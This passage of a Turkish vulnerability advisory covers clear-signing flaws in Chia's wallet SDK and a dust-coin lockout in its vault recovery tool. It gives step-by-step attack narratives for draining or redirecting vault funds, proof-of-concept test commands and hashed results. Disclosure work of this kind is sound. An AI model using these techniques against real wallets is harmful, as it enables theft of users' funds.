3. **Adım 3 — İmzalanan İşlemin Zincir Üstünde `500 XCH` Transfer Etmesi:** Kullanıcı ekranda bu çıkışı görmeden imzayı atar; ancak konsensüs katmanında her iki bacak da geçerli olduğu için `500 XCH` saldırgana aktarılır.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Uses set intersection across dependent settlement legs instead of accounting for every
// notarized payment outflow funded by the vault's settlement coins!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — P2P Takas Teklifinde (`Offer`) Gizlenen `500 XCH` (`500,000,000,000,000 mojo`) Ödeme Bacağı (`POC-4`):** Kullanıcı çok bacaklı bir takas teklifini imzalarken Clear-Signing ekranında ikinci bacaktaki `500 XCH` çıkışı (`7c05b725fb43d8fa...`) hiç görünmez; imza atıldığında `500 XCH` saldırgana geçer.
* **Senaryo B — Kurumsal Hazine Takasında Gizli Çıkış:** Hazine yöneticisi küçük bir takas onayladığını sanırken kesişim dışında bırakılan ikinci settlement bacağıyla `500 XCH` kaybeder.
* **Senaryo C — Yamalı (`GREEN`) Doğrulama:** Yama sonrasında tüm settlement bacaklarının birleşimi zorunlu tutulur.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run POC-4 (500 XCH Dependent Offer Leg Set-Intersection Omission) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc4 -- --nocapture
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-CS-03": {
    "RED": {
      "poc4_vault_spend_bundle_sha256": "3c55638a605214afd4e6ca592d439b6e9b69e4550f40ce07f85daec8cef87fb8",
      "poc4_settlement_spend_bundle_sha256": "7c05b725fb43d8fae280b3e1cd0417b752598e8ce9bd7ae45c1a2f7b63ccf525",
      "omitted_outflow_mojo": 500000000000000
    },
    "GREEN": {
      "poc4_rejected_or_fully_accounted": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.27 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Açılmamış (Unrevealed) Settlement Harcaması Kör Noktası İle İmza Sonrası `600 XCH` Çekilmesi (`CS-04` / `POC-5`) (`CWE-345 / CWE-451`, CVSS `8.6 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (unrevealed settlement output handling)
* **Zafiyet Sınıfı & Skor:** `CWE-345 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md`](advisories/tr/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `SETTLEMENT_PAYMENT_HASH` Coin'lerinin Ek İmza Gerektirmeden Harcanabilmesi:** Kasa harcaması içinden `SETTLEMENT_PAYMENT_HASH` adresine bir coin oluşturulduğunda, bu settlement coin'in harcanması için kasanın ek bir BLS imzasına ihtiyaç yoktur.
2. **Adım 2 — Settlement Harcaması Paketten Gizlendiğinde Clear-Signing'in Çıkışı Görmemesi (`clear_signing.rs`):** `POC-5` içinde kasa harcaması (`a9eeda2c8526d95c...`, `1.303 bayt`) `600 XCH` (`600,000,000,000,000 mojo`) değerinde bir settlement coin üretir ancak bu coin'in nereye gideceğini gösteren harcamayı imza öncesi pakete koymaz; yamasız Clear-Signing bunu zararsız kabul eder.
3. **Adım 3 — Kullanıcı İmzaladıktan Sonra Saldırganın `600 XCH` Settlement Harcamasını (`e0b876fbb8e0f264...`) Pakete Eklemesi:** İmza alındıktan sonra saldırgan `388 bayt` uzunluğundaki settlement harcamasını pakete ekleyerek `600 XCH`'yi kendi adresine çeker.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Allows a vault spend to create a SETTLEMENT_PAYMENT_HASH coin without requiring
// the corresponding settlement CoinSpend to be revealed and verified in the signing bundle!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — İmza Sırasında Gizlenen Settlement Harcamasının İmza Sonrasında Eklenerek `600 XCH` (`600,000,000,000,000 mojo`) Çalınması (`POC-5`):** Kurban `a9eeda2c8526d95c...` paketini imzalarken ekranda dışarıya giden bir alıcı görmez; saldırgan imzalı paketin yanına `e0b876fbb8e0f264...` settlement harcamasını ekleyip `600 XCH`'yi çeker.
* **Senaryo B — Donanım Cüzdanlarında (Air-Gapped Signer) Kör İmzalama:** Çevrimdışı imzalayıcı cihazda alıcı adresi görünmeden `600 XCH` çıkışına imza attırılır.
* **Senaryo C — Yamalı (`GREEN`) Doğrulama:** Karşılığı pakette açılmamış (`unrevealed`) settlement çıktısı içeren işlemler imzalanmadan reddedilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run POC-5 (600 XCH Unrevealed Settlement Spend Blind Spot) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc5 -- --nocapture
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-CS-04": {
    "RED": {
      "poc5_vault_spend_bundle_sha256": "a9eeda2c8526d95cb0a36ffcdf9a026b23e96c11e15ee419938e18dc342277eb",
      "poc5_vault_spend_bundle_bytes": 1303,
      "poc5_attached_settlement_spend_bundle_sha256": "e0b876fbb8e0f26400a38fb5e2e9963a5cb1dbff92b76d78b4403ed0cb2f7cbe",
      "poc5_attached_settlement_bytes": 388,
      "hidden_outflow_mojo": 600000000000000
    },
    "GREEN": {
      "poc5_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.28 — Chia-Network/cni-wallet-sdk (`chia-sdk-bindings <= 0.38.0 / chia-sdk-driver <= 0.36.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Harici `DropCoin` İle Kasa Para Üstü (Change) Sahteciliği ve `chia-sdk-bindings` FFI Sınırında `1.000 XCH` Kasa Boşaltma (`CS-05` / `POC-6`) (`CWE-682 / CWE-451`, CVSS `9.1 Critical`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (`chia-sdk-driver` & `chia-sdk-bindings` FFI): chia-sdk-bindings`)
* **Etkilenen Sürüm & Bileşenler:** `chia-sdk-bindings <= 0.38.0 / chia-sdk-driver <= 0.36.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs`, `crates/chia-sdk-bindings/src/clear_signing.rs:62` (`parse_vault_transaction`)
* **Zafiyet Sınıfı & Skor:** `CWE-682 / CWE-451` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md`](advisories/tr/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Kasaya Ait Olmayan Harici `DropCoin` Çıktısının 'Kasaya Dönen Para Üstü (Change)' Sayılması (`clear_signing.rs` & `chia-sdk-bindings/src/clear_signing.rs:62`):** `parse_vault_transaction` fonksiyonu kasadan çıkan net parayı hesaplarken, kasa adresine gelen çıktıları 'para üstü (change)' olarak düşer; ancak bu çıktıyı üreten üst coin'in (`DropCoin`) gerçekten kasaya ait olup olmadığını kontrol etmez!
2. **Adım 2 — Kasadan Çalınan `1.000 XCH` (`1,000,000,000,000,000 mojo`) Tutarının Ekranda `0 XCH Kayıp` Gösterilmesi (`SpendBundle SHA-256: aa65182292515596...`):** `1.477 bayt` uzunluğundaki `POC-6` `SpendBundle` içinde kasa saldırgana `1.000 XCH` gönderirken, pakete eklenen harici bir `DropCoin` harcaması kasa adresine sahte/dış bağlamlı çıktı gösterir; Clear-Signing bunları birbirinden düşerek ekranda net kaybı `0` olarak gösterir.
3. **Adım 3 — Doğrudan `chia-sdk-bindings` FFI Sınırında Kanıt (`clear_signing_ffi_proof.rs`):** Mobil/masaüstü uygulamaların çağırdığı gerçek FFI fonksiyonu `chia_sdk_bindings::parse_vault_transaction` üzerinde yapılan testte `RED` modda `1.000 XCH` çıkışın gizlendiği, `GREEN` modda ise `Error::NonStandardInnerSpend` ile reddedildiği kanıtlanmıştır.

```rust
// File: crates/chia-sdk-bindings/src/clear_signing.rs (line 62) & chia-sdk-driver/src/clear_signing.rs
pub fn parse_vault_transaction(vault: ClvmVault, spend_bundle: SpendBundle, ...) -> Result<TransactionSummary> {
    // BUG: Credits outputs from external non-vault DropCoin spends as vault change,
    // masking a 1,000 XCH outflow from the victim's vault!
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Kurumsal Kasadan (Chia Vault) Çalınan `1.000 XCH`'nin (`1,000,000,000,000,000 mojo`) FFI Sınırında `0 XCH Net Çıkış` Gösterilmesi (`POC-6`):** Kasa yöneticisi `chia-sdk-bindings` kullanan imzalayıcı uygulamada `aa65182292515596...` (`1.477 bayt`) paketini inceler; ekranda kasadan net para çıkmadığı göründüğü için onay verir ve `1.000 XCH` saldırgana aktarılır.
* **Senaryo B — Çoklu İmza (Multi-Sig) Kurulunun Tamamının Yanıltılması:** Kasadaki tüm ortak imzacılar kendi cihazlarında aynı yanıltıcı `TransactionSummary` özetini görerek `1.000 XCH` çıkışına imza atar.
* **Senaryo C — `clear_signing_ffi_proof.rs` FFI Kanıtı (`GREEN`):** Yamalı kodda `chia_sdk_bindings::parse_vault_transaction` harici `DropCoin` içeren paketi `Error::NonStandardInnerSpend` ile reddeder.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run POC-6 in chia-sdk-driver and the FFI Boundary Proof in chia-sdk-bindings
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc6 -- --nocapture
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-bindings --test clear_signing_ffi_proof -- --nocapture
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-CS-05": {
    "RED": {
      "poc6_spend_bundle_sha256": "aa6518229251559629861e9137f5cbd5186cb20b46c216a64dc209b86ed3004e",
      "poc6_spend_bundle_bytes": 1477,
      "vault_drain_amount_mojo": 1000000000000000,
      "ffi_boundary_parse_vault_transaction_masked": true
    },
    "GREEN": {
      "ffi_boundary_rejected_with": "Error::NonStandardInnerSpend",
      "ffi_test_file_sha256": "73dbe05adb2538ceb88cca5b2ecf4c1678e4ed537d3accb17535d8666727fb52"
    }
  }
}
```


---

### III.29 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Teklif Ön-Bölme (Pre-Split) Bağlamsız Hedef Ekleme (`Post-Signature Splicing`) İle BLS İmzası Bozulmadan `1.000 XCH` Yönlendirme (`CS-06` / `POC-7`) (`CWE-347 / CWE-451`, CVSS `9.1 Critical`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (offer pre-split coin destination binding)
* **Zafiyet Sınıfı & Skor:** `CWE-347 / CWE-451` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md`](advisories/tr/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Ön-Bölme (`Pre-Split`) Ara Coin Çıktısının Son Alıcıya Kriptografik Olarak Bağlanmaması (`clear_signing.rs`):** Kullanıcı `1.000 XCH` (`1,000,000,000,000,000 mojo`) tutarındaki bir Offer ön-bölme paketini (`476b8e836e435eec...`, `1.994 bayt`) imzalarken, Clear-Signing ara coin harcamasının kasanın imzaladığı bir anonsla (`ASSERT_PUZZLE_ANNOUNCEMENT`) kilitlenip kilitlenmediğini doğrulamaz.
2. **Adım 2 — Kullanıcı İmzaladıktan Sonra Alt Harcamanın Değiştirilmesi (`Post-Signature Splicing`):** Kurban imzayı attıktan sonra saldırgan alt harcamayı değiştirerek `5b3a3b21376bfdfe06e7cc1ec334c43ffd3bb97b72133aeaa38f4de040ba0a93` (`1.701 bayt`) özetli yeni `SpendBundle` paketini oluşturur.
3. **Adım 3 — BLS İmzası Hiç Bozulmadan `1.000 XCH`'nin Saldırgana Akarılması:** Kurbanın ilk attığı BLS imzası yeni pakette de tamamen geçerli kalır ve `1.000 XCH` kurbanın onayladığı alıcı yerine doğrudan saldırganın adresine gider!

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Accepts pre-split / intermediate child spends in Clear-Signing without verifying
// that the vault's signed spend asserts an announcement binding the child spend's outputs!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Kullanıcı İmzaladıktan Sonra İmza Bozulmadan `1.000 XCH`'nin (`1,000,000,000,000,000 mojo`) Saldırgana Yönlendirilmesi (`POC-7`):** Kurban ekranda doğru alıcıyı görerek `476b8e836e435eec...` paketini imzalar; saldırgan imza sonrası alt harcamayı değiştirip `5b3a3b21376bfdfe...` paketini ağa sürer ve aynı BLS imzasıyla `1.000 XCH`'yi çalar.
* **Senaryo B — Mempool Üzerinde İmzasız Alt Harcamanın Değiştirilmesi:** Ağdaki bir gözlemci imzasız alt harcamayı blok kazılmadan önce kendi adresiyle değiştirir.
* **Senaryo C — Yamalı (`GREEN`) Doğrulama:** Kasa tarafından kriptografik anonsla bağlanmamış tüm ön-bölme/alt harcamalar reddedilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run POC-7 (1,000 XCH Offer Pre-Split Post-Signature Splicing) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc7 -- --nocapture
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-CS-06": {
    "RED": {
      "poc7_pre_split_spend_bundle_sha256": "476b8e836e435eecb16fb924b8d8b8532fb6872fda3f9d50030d98231fff7833",
      "poc7_pre_split_bytes": 1994,
      "poc7_spliced_final_spend_bundle_sha256": "5b3a3b21376bfdfe06e7cc1ec334c43ffd3bb97b72133aeaa38f4de040ba0a93",
      "poc7_spliced_final_bytes": 1701,
      "redirected_amount_mojo": 1000000000000000,
      "original_bls_signature_valid_on_spliced": true
    },
    "GREEN": {
      "poc7_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.30 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Ters-Clawback (`sender_puzzle_hash`) Sahiplik Sahteciliği İle `1.000 XCH` İptal Yetkisinin Saldırgana Verilmesi (`CS-07` / `POC-8`) (`CWE-345 / CWE-451`, CVSS `8.6 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (Clawback `sender_puzzle_hash` ownership check)
* **Zafiyet Sınıfı & Skor:** `CWE-345 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md`](advisories/tr/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Clawback `sender_puzzle_hash` (İptal Yetkilisi) Alanının Kasa Adresiyle Karşılaştırılmaması (`clear_signing.rs`):** Bir kasa Clawback korumalı bir ödeme oluşturduğunda (`POC-8`), `cni-wallet-sdk` Clawback yapısını ayrıştırırken `sender_puzzle_hash` (yani süre dolmadan parayı geri çekme/iptal etme yetkisine sahip adres) alanının gerçekten imzalayan kasaya ait olup olmadığını kontrol etmez!
2. **Adım 2 — Ters-Clawback Tuzağı (`SpendBundle SHA-256: 6897c10eb9cf718f...`):** `1.218 bayt` uzunluğundaki `SpendBundle` içinde kurbanın kasasından çıkan `1.000 XCH` (`1,000,000,000,000,000 mojo`) Clawback coin'ine kilitlenir; ancak iptal yetkilisi (`sender_puzzle_hash`) olarak saldırganın adresi yazılmıştır.
3. **Adım 3 — İşlem Zincire Girer Girmez Saldırganın `1.000 XCH`'yi 'İptal Ederek' Çalması:** Kurban kendisini Clawback korumalı bir işlem yaptığını sanarak imzalar; işlem onaylandığı anda saldırgan `sender` yetkisini kullanarak `1.000 XCH`'yi beklemeden kendi cüzdanına çeker.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Parses Clawback output without verifying clawback.sender_puzzle_hash == vault_p2_puzzle_hash,
// allowing an attacker to be set as the Clawback sender on a 1,000 XCH vault outflow!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Korumalı Transfer Görünümlü İşlemde `1.000 XCH` (`1,000,000,000,000,000 mojo`) İptal Yetkisinin Saldırgana Verilmesi (`POC-8`):** Kasa yöneticisi `6897c10eb9cf718f...` paketini Clawback korumalı güvenli transfer sanarak imzalar; saldırgan `sender_puzzle_hash` olarak tanımlandığı için parayı anında geri çekerek çalar.
* **Senaryo B — Kendi Adresine Transfer Yanılsaması:** Alıcı (`receiver`) kısmına kurbanın kendi adresi yazılıp `sender` kısmına saldırgan yazıldığında, kurban parayı kendisine gönderdiğini sanırken saldırgan süre dolmadan parayı çeker.
* **Senaryo C — Yamalı (`GREEN`) Doğrulama:** `sender_puzzle_hash` değeri kasaya ait olmayan Clawback çıktıları reddedilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run POC-8 (1,000 XCH Reverse-Clawback Sender Hijack) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc8 -- --nocapture
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-CS-07": {
    "RED": {
      "poc8_spend_bundle_sha256": "6897c10eb9cf718ffa9bbfff998e6a496d3532bf2d198c8df16bf92e2d5f9db1",
      "poc8_spend_bundle_bytes": 1218,
      "hijacked_clawback_amount_mojo": 1000000000000000,
      "attacker_is_clawback_sender": true
    },
    "GREEN": {
      "poc8_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.31 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Dış CAT Halkası (Ring) Eritme/İhraç (`RUN_TAIL` Melt/Issuance) Hesaplama Eksikliği İle `750 XCH` Ölçeğinde Varlık Çıkışı (`CS-08` / `POC-9`) (`CWE-682 / CWE-451`, CVSS `8.6 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (external CAT ring TAIL melt/issuance accounting)
* **Zafiyet Sınıfı & Skor:** `CWE-682 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md`](advisories/tr/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Chia CAT Halkasında (Ring) Değer Korunumunun Tüm Halka Boyunca Hesaplanması:** Chia CAT standardında aynı halkadaki coin harcamaları birbirinin açığını/fazlasını dengeler; halkadaki harici bir coin `RUN_TAIL` (`51 0 -113`) ile token erittiğinde (melt) bu fark kasanın harcadığı CAT coin'inden karşılanır.
2. **Adım 2 — Clear-Signing Motorunun Dış Halkadaki `RUN_TAIL` Eritme İşlemini Hesaba Katmaması (`clear_signing.rs`):** `2.541 bayt` uzunluğundaki `POC-9` `SpendBundle` (`e48c3171dc9a9b4b...`) içinde kurbanın kasasından çıkan `750,000,000,000,000` mojo (`750 XCH` ölçeği), dış halkadaki eritme (`melt`) işlemiyle çekilirken Clear-Signing özetinde gizlenir.
3. **Adım 3 — İmza Sonrası Varlık Kaybı:** Kullanıcı dengeli görünen işlemi imzaladığında `750 XCH` ölçeğindeki varlık kasadan eksilir.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Does not account for external CAT ring members executing RUN_TAIL melt/issuance deltas
// funded by the vault's CAT coin spend!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Dış CAT Halkası Üzerinden `750 XCH` Ölçeğinde (`750,000,000,000,000 mojo`) Gizli Varlık Eritme (`POC-9`):** Kasa yöneticisi `e48c3171dc9a9b4b...` (`2.541 bayt`) paketini imzaladığında, dış halkadaki `RUN_TAIL` eritme işlemi kasadaki varlığı çeker.
* **Senaryo B — Sarılmış Varlık (Wrapped Asset / Stablecoin) İtfa Soygunu:** Saldırgan kurbanın CAT harcamasını kendi harici eritme halkasına bağlayarak karşılık fonları çeker.
* **Senaryo C — Yamalı (`GREEN`) Doğrulama:** Tüm CAT halkası üyelerinin net delta korunumu zorunlu tutulur.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run POC-9 (750 XCH-Scale External CAT Ring Melt/Issuance Omission) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc9 -- --nocapture
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-CS-08": {
    "RED": {
      "poc9_spend_bundle_sha256": "e48c3171dc9a9b4b5914597784e7b5039a9af340c66aa2158bac22f1fba295ff",
      "poc9_spend_bundle_bytes": 2541,
      "omitted_cat_ring_delta_mojo": 750000000000000
    },
    "GREEN": {
      "poc9_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.32 — Chia-Network/chia-vault-recover (`<= 1.0.0-rc9 (verified on commit 75e3a8efe02a131adbf3059afc20852de183ca82)`) — `chia-vault-recover` (`1.0.0-rc9`) Doğrulanmamış İlk Singleton Launcher Seçimi Nedeniyle `1 Mojo` Toz (Dust) Coin İle Acil Kasa Kurtarma Aracının Kilitlenmesi (`VR-01` / `POC-10`) (`CWE-345 / CWE-400`, CVSS `7.5 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/chia-vault-recover` (`Cargo / Rust (Chia Emergency Vault Recovery CLI): chia-vault-recover`)
* **Etkilenen Sürüm & Bileşenler:** `<= 1.0.0-rc9 (verified on commit 75e3a8efe02a131adbf3059afc20852de183ca82)` — `src/locate.rs:148-219` (`find_launcher_id`)
* **Zafiyet Sınıfı & Skor:** `CWE-345 / CWE-400` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md`](advisories/tr/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `find_launcher_id` İçinde İlk Bulunan `SINGLETON_LAUNCHER_HASH` Kaydının Doğrulanmadan Seçilmesi (`src/locate.rs:148-219`):** `chia-vault-recover` aracı kullanıcının kasasını bulmak için adresteki tüm coin'leri sorgular, üst harcamalarına bakar ve `SINGLETON_LAUNCHER_HASH` tipindeki **ilk** alt coin'i kullanıcının kasası kabul ederek döner.
2. **Adım 2 — `1 Mojo` Toz (Dust) Coin Göndererek Kasa Keşfinin Zehirlenmesi:** Saldırgan kurbanın adresine `1 mojo` değerinde bir toz coin gönderir ve aynı işlemde sahte bir singleton (`2de44601e6fcf4bdfc88eb553ddca729751a06da78cec724519e741f1dfefacf`) başlatır. `FullNodeRpcApi` kayıtları blok yüksekliğine göre döndürdüğü için araç kurbanın gerçek kasasına (`e53d0c41ce3a78de1426630d059958ef37a5d7f55551d47908f9a106024640eb`) ulaşamadan saldırganın sahte kasasını seçer.
3. **Adım 3 — Derlenmiş `chia-vault-recover` (`1.0.0-rc9`) İkilisinin `recovery phrase does not match` Hatasıyla Çökmesi:** Canlı `FullNodeRpcApi` karşısında çalıştırılan yamasız ikili (`chia-vault-recover-red`) sahte `launcher_id` yüzünden kurtarma kelimelerinin uyuşmadığını söyleyerek çöker; yamalı release ikilisi (`d6e6b0bb...`) ise sahte launcher'ı atlayıp gerçek kasayı kurtarır.

```rust
// File: src/locate.rs (lines 148-219)
pub async fn find_launcher_id(client: &Client, address_puzzle_hash: Bytes32, ...) -> Result<Bytes32> {
    // BUG: Returns the very first SINGLETON_LAUNCHER_HASH child found at address_puzzle_hash
    // without verifying that the singleton's custody/recovery configuration matches the user's keys!
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — `1 Mojo` Toz Coin İle Acil Kasa Kurtarma Aracının (`chia-vault-recover`) Çökertilmesi (`POC-10`):** Anahtarını kaybeden veya acil kurtarma yapmak isteyen kullanıcı `chia-vault-recover` (`1.0.0-rc9`) aracını çalıştırdığında, saldırganın gönderdiği `1 mojo` yüzünden araç `clawback check: recovery phrase does not match` hatası vererek durur.
